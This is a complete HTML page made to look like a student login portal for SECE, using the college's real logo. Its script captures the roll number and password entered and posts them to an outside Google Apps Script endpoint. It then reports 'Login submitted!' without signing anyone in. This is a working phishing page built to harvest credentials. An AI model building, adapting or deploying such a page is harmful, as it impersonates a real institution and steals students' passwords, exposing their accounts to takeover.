<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login - SECE</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f0f4f8;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-container {
      background: white;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
      width: 350px;
      text-align: center;
    }

    .login-container img {
      width: 300px;
      height: 250px;
      margin-bottom: 20px;
    }

    .login-container h2 {
      margin-bottom: 20px;
      color: #333;
    }

    input[type="text"],
    input[type="password"] {
      width: 90%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 8px;
    }

    button {
      width: 95%;
      padding: 10px;
      background: #2c3e50;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-weight: bold;
    }

    button:hover {
      background: #1a242f;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <img src="https://sece.ac.in/wp-content/uploads/2024/05/clg-logo2-1024x292.webp" alt="SECE Logo">
    <h2>Student Login</h2>
    <form id="loginForm">
      <input type="text" name="username" placeholder="Enter Roll Number" required><br>
      <input type="password" name="password" placeholder="Enter Password" required><br>
      <button type="submit">Login</button>
    </form>
  </div>

  <script>
    const form = document.getElementById('loginForm');

    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      const formData = {
        username: form.username.value,
        password: form.password.value
      };

      try {
        const response = await fetch("https://script.google.com/macros/s/AKfycbwiYOMyheqjo0znKg9V9aee5fMYBpzhbGotchgpU2Ql2YlaHYm2yze7eq8i3kuqBRszgg/exec", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(formData)
        });

        if (response.ok) {
          alert("Login submitted!");
          form.reset();
        } else {
          alert("Error submitting login");
        }
      } catch (error) {
        alert("Request failed: " + error);
      }
    });
  </script>
</body>
</html>
